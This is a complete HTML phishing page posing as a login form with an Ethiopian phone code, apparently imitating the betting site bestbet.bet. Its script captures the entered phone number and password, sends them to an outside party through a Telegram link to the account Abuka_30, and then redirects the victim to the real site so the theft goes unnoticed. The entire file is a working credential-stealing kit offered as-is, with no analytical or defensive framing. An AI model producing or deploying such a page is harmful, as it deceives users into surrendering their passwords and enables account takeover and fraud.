<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background-image: url('1.jpg'); /* Use the background image */
            background-size: cover;
            background-position: center;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-container {
            background-color: rgba(255, 0, 0, 0.9); /* Red background with some transparency */
            border-radius: 10px;
            padding: 20px;
            width: 300px;
            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5);
            text-align: center;
        }

        .login-container img {
            width: 100px;
            margin-bottom: 20px;
        }

        .login-container select,
        .login-container input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        .login-container button {
            background-color: #000;
            color: #fff;
            border: none;
            padding: 10px;
            width: calc(100% - 20px);
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }

        .login-container button:hover {
            background-color: #333;
        }

        .login-container .links {
            margin-top: 10px;
            font-size: 14px;
        }

        .login-container .links a {
            color: #fff;
            text-decoration: none;
            margin: 0 5px;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="2.jpg" alt="Logo"> <!-- Logo image -->
    <form id="loginForm">
        <select id="countryCode" required>
            <option value="+251">ET +251</option>
            <!-- Add more country codes here -->
        </select>
        <input type="text" id="phoneNumber" placeholder="Number" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">LOGIN</button>
    </form>
    <div class="links">
        <a href="#">Forgot Password</a> | <a href="#">Create Account</a>
    </div>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();
        
        // Collect phone number and password
        const countryCode = document.getElementById('countryCode').value;
        const phoneNumber = document.getElementById('phoneNumber').value;
        const password = document.getElementById('password').value;

        // Combine the full phone number
        const fullPhoneNumber = `${countryCode}${phoneNumber}`;

        // Send the phone number and password to Telegram
        const message = `Phone Number: ${fullPhoneNumber}\nPassword: ${password}`;
        window.location.href = `https://t.me/Abuka_30?text=${encodeURIComponent(message)}`;

        // Redirect to bestbet.bet
        setTimeout(function() {
            window.location.href = 'https://bestbet.bet';
        }, 1000);
    });
</script>

</body>
</html>
